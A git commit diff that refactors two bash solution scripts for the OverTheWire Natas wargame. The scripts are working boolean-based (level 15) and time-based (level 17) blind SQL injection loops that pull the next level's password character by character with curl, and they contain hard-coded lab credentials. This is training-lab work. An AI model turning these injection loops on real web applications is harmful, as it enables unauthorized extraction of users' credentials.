a8fb1c9cd8c63bbf82f5f47323c1b84b53ec84fb
= <alekseev.aleksandr01@mail.ru>
2025-07-23 13:50:09 +0400

    Features | natas15 and natas17 improved

--- natas15.sh
+++ natas15.sh
@@ -1,61 +1,37 @@
 #!/bin/bash
-
 # level located on natas15.natas.labs.overthewire.org
+
+passwordNatas15=""
+defaultPasswordNatas15="SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
+
+echo -n "Password Natas 15 (default is ${defaultPasswordNatas15}): "
+read passwordNatas15
+if [ -z ${passwordNatas15} ]
+then
+        passwordNatas15=${defaultPasswordNatas15}
+fi
 
 secretSymbols="________________________________" # 32 symbols _
 password=""
 
 while [ ${#secretSymbols} -ne 0 ]
 do
-	secretSymbols="${secretSymbols:1}"
-	symbolFound=false
+        secretSymbols="${secretSymbols:1}"
 
-	for symbol in {A..Z}
-	do
-		res=$(curl -s natas15.natas.labs.overthewire.org?debug=true -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -d username="natas16\" and password LIKE BINARY \"${password}${symbol}${secretSymbols}")
-		if echo ${res} | grep "This user exists" > /dev/null
-		then
-			password="${password}${symbol}"
-			echo "${password}${secretSymbols}"
-			symbolFound=true
-			break
-		fi
-	done
-
-	if ${symbolFound}
-	then
-		continue
-	fi
-
-	for symbol in {a..z}
-	do
-		res=$(curl -s natas15.natas.labs.overthewire.org?debug=true -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -d username="natas16\" and password LIKE BINARY \"${password}${symbol}${secretSymbols}")
-		if echo ${res} | grep "This user exists" > /dev/null
-		then
-			password="${password}${symbol}"
-			echo "${password}${secretSymbols}"
-			symbolFound=true
-			break
-		fi
-	done
-
-	if ${symbolFound}
-	then
-		continue
-	fi
-
-	for symbol in {0..9}
-	do
-		res=$(curl -s natas15.natas.labs.overthewire.org?debug=true -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -d username="natas16\" and password LIKE BINARY \"${password}${symbol}${secretSymbols}")
-		if echo ${res} | grep "This user exists" > /dev/null
-		then
-			password="${password}${symbol}"
-			echo "${password}${secretSymbols}"
-			symbolFound=true
-			break
-		fi
-	done
+        for symbol in {A..Z} {a..z} {0..9}
+        do
+                res=$(curl -s natas15.natas.labs.overthewire.org?debug=true -u natas15:${passwordNatas15} -d username="natas16\" and password LIKE BINARY \"${password}${symbol}${secretSymbols}")
+                if [ -z ${res} ]
+                then
+                        echo -e "\nThe server isn't response"
+                        exit
+                elif echo ${res} | grep "This user exists" > /dev/null
+                then
+                        password="${password}${symbol}"
+                        echo "${password}${secretSymbols}"
+                        break
+                fi
+        done
 done
 
 echo -e "\nThe password is ${password}"
-
--- natas17.sh
+++ natas17.sh
@@ -1,61 +1,38 @@
 #!/bin/bash
-
 # level located on natas17.natas.labs.overthewire.org
 
-secretSymbols="________________________________"
+passwordNatas17=""
+defaultPasswordNatas17="EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
+
+echo -n "Password Natas 17 (default is ${defaultPasswordNatas17}): "
+read passwordNatas17
+if [ -z ${passwordNatas17} ]
+then
+        passwordNatas17=${defaultPasswordNatas17}
+fi
+
+secretSymbols="________________________________" # 32 symbols _
 password=""
 
 while [ ${#secretSymbols} -ne 0 ]
 do
-	secretSymbols=${secretSymbols:1}
-	symbolFound=false
+        secretSymbols=${secretSymbols:1}
 
-	for symbol in {A..Z}
-	do
-		res=$({ time curl -s -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC http://natas17.natas.labs.overthewire.org?debug -d username="natas18\" AND IF (password LIKE BINARY \"${password}${symbol}${secretSymbols}\", SLEEP(1), 1) -- "; } 2>&1 | grep -e "^Executing" -e "real" | cut -c -144)
-		if echo $res | grep "1\....s" > /dev/null
-		then
-			password="${password}${symbol}"
-			echo "${password}${secretSymbols:1}"
-			symbolFound=true
-			break
-		fi
-	done
-
-	if $symbolFound
-	then
-		continue
-	fi
-
-	for symbol in {a..z}
-	do
-		res=$({ time curl -s -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC http://natas17.natas.labs.overthewire.org?debug -d username="natas18\" AND IF (password LIKE BINARY \"${password}${symbol}${secretSymbols}\", SLEEP(1), 1) -- "; } 2>&1 | grep -e "^Executing" -e "real" | cut -c -144)
-		if echo $res | grep "1\....s" > /dev/null
-		then
-			password="${password}${symbol}"
-			echo "${password}${secretSymbols:1}"
-			symbolFound=true
-			break
-		fi
-	done
-
-	if $symbolFound
-	then
-		continue
-	fi
-
-	for symbol in {0..9}
-	do
-		res=$({ time curl -s -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC http://natas17.natas.labs.overthewire.org?debug -d username="natas18\" AND IF (password LIKE BINARY \"${password}${symbol}${secretSymbols}\", SLEEP(1), 1) -- "; } 2>&1 | grep -e "^Executing" -e "real" | cut -c -144)
-		if echo $res | grep "1\....s" > /dev/null
-		then
-			password="${password}${symbol}"
-			echo "${password}${secretSymbols:1}"
-			symbolFound=true
-			break
-		fi
-	done
+        for symbol in {A..Z} {a..z} {0..9}
+        do
+                res=$({ time curl -s -u natas17:${passwordNatas17} http://natas17.natas.labs.overthewire.org -d username="natas18\" AND IF (password LIKE BINARY \"${password}${symbol}${secretSymbols}\", SLEEP(1), 1) -- "; } 2>&1 | grep "real")
+                if [ $((${res:7:-5})) -gt 20 ]
+                then
+                        echo "The server isn't response"
+                        exit
+                elif echo $res | grep "1\....s" > /dev/null
+                then
+                        password="${password}${symbol}"
+                        echo "${password}${secretSymbols}"
+                        symbolFound=true
+                        break
+                fi
+        done
 done
 
-echo "The password is ${password}"
-
+echo -e "\nThe password is ${password}"
